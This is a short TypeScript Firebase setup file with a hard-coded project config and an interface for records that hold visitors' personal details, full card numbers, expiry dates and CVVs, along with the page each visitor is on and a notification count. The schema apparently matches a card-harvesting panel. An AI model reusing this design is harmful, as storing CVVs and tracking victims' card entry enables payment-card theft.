import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
   apiKey: "AIzaSyBZNSfrMHsV7I9JO8UXelqaues2Xeo9d-I",
  authDomain: "orediioo.firebaseapp.com",
  projectId: "orediioo",
  storageBucket: "orediioo.firebasestorage.app",
  messagingSenderId: "53713721298",
  appId: "1:53713721298:web:580696287a295ec2c09a0b",
  measurementId: "G-FBMDTCESJW"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

